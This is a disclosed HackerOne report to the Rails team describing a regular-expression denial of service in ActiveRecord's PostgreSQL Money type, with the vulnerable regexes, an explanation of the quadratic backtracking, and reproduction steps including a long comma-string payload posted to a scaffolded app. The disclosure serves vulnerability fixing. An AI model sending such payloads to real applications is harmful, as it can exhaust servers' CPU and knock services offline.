# Regular expression denial of service in ActiveRecord's PostgreSQL Money type

## Report Details
- **Report ID**: 1023899
- **URL**: https://hackerone.com/reports/1023899
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-11-01T14:22:54.710Z
- **Disclosed**: 2021-02-11T00:13:07.326Z

## Reporter
- **Username**: dee-see
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rails

## Vulnerability Information
## Summary

Hello team! The regular expressions used in the [Money](https://github.com/rails/rails/blob/ddd0e9b/activerecord/lib/active_record/connection_adapters/postgresql/oid/money.rb#L29) type to convert strings like `-$100,000.00` to `100000` have an execution time with a quadratic growth proportional to the length of the string.

Causing the denial of service requires very long strings but if the parameter is in a post body that won't be a problem.

## Details

The regular expressions marked `(1)` and `(2)` in [the following code](https://github.com/rails/rails/blob/ddd0e9b/activerecord/lib/active_record/connection_adapters/postgresql/oid/money.rb#L28-L33) are the vulnerable expressions

```ruby
            case value
            when /^-?\D*[\d,]+\.\d{2}$/  # (1)
              value.gsub!(/[^-\d.]/, "")
            when /^-?\D*[\d.]+,\d{2}$/  # (2)
              value.gsub!(/[^-\d,]/, "").sub!(/,/, ".")
            end
```

This code is invoked when Rails saves a user-input value in a `Money` field. If we look at the first expression, the problem comes from this bit `\D*[\d,]+`. It matches "not a number" 0 or more times and then "a number or a ," one or more times. The `,` can match both expressions so this is somewhat equivalent to `,*,+` as far as the attack is concerned and is where the `O(n^2)` execution time comes from.

## Steps to reproduce

I'm going to assume PostgreSQL is installed and configured on the machine.

Now we'll install the PostgreSQL ruby interface, setup a rails application and scaffold a view for the attack.

```ruby
gem install pg
rails new moneydos --database=postgresql
cd moneydos
rails db:setup
rails g scaffold Money amount:money
rake db:migrate
```

Now in the `rails console` run these commands. (The same could be accomplished though the UI, but this is simpler for reproduction purpose)

```ruby
app.host = 'localhost'
app.get '/money'
token = app.session[:_csrf_token]
app.post '/money/', params: {money: {amount: ("$" + ","*100000 + ".11!")}, authenticity_token: token}
```

The last line takes 40 seconds to execute on my machine. Add a 0 to the `","*100000` part and the CPU will pretty much spin forever. An attacker could repeat those requests many times to reach full saturation of the host's CPU capabilities and achieve a complete denial of service.

## Impact

Denial of service and 100% CPU usage in situations where a malicious user is able to input money amounts in a request body (web shops come to mind as the obvious target)

## Attachments
No attachments
